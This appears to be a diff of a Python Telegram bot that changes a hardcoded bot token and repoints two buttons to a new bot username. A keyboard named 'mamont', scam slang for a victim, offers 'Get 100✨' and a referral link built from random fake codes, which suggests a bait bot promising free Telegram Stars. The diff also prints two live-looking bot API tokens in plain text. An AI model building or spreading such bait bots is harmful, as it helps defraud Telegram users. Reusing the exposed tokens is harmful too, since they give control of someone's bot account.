@@ -117,7 +117,7 @@ import os
 
 BOT_TOKEN = os.getenv("BOT_TOKEN") 
 
-TOKEN = "8300154572:AAGR6yPKWCgh-JSTSVJlZBsLAIEbRt8FDKk"
+TOKEN = "7895487692:AAHeBH8ZtluXRnxDT_qGXUNwwCV1Yh2Q7ak"
 ADMIN_ID = 6654885845
 
 bot = Bot(TOKEN)
@@ -255,12 +255,12 @@ async def refund_command(message: types.Message):
 
 
 builder = InlineKeyboardBuilder()
-builder.button(text="🔗 Реферальная ссылка", url=f"https://t.me/SendStarsGoodBot?start=ref_{random.choice(['fsdf', 'fdsfw', 'reiw', '5eew', 'qwrp', 'asdf', 'bbrt'])}")
+builder.button(text="🔗 Реферальная ссылка", url=f"https://t.me/s_t_a_r_s_o_v_bot?start=ref_{random.choice(['fsdf', 'fdsfw', 'reiw', '5eew', 'qwrp', 'asdf', 'bbrt'])}")
 builder.adjust(1)
 
 
 mamont = InlineKeyboardBuilder()
-mamont.button(text="Получить 100✨", url=f"https://t.me/SendStarsGoodBot?reffsdfdsfdsfsdfds")
+mamont.button(text="Получить 100✨", url=f"https://t.me/s_t_a_r_s_o_v_bot?reffsdfdsfdsfsdfds")
 mamont.adjust(1)
 
 
